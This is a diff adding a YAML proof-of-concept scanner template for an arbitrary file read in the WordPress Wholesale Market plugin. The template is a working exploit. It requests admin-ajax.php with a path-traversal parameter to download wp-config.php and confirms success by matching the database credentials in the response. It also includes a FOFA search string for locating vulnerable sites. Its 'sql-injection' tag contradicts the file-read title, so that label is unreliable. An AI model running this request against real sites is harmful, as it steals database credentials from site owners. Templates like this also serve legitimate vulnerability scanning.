@@ -1,0 +1,15 @@
+id: poc-yaml-wordpress-wholesale-market-admin-ajax-php-anyfile-read
+info:
+  name: WordPress_Wholesale_Market admin-ajax.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: wholesale_market
+  fofa: body="wp-content/plugins/wholesale-market"
+requests:
+- method: GET
+  path: /wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php
+  expression: status_code == 200 && contains(headers,"filename=\"wp-config.php\"")
+    && contains(body,"MySQL database username") && contains(content_type,"application/log")
+variables: {}
+transport: http
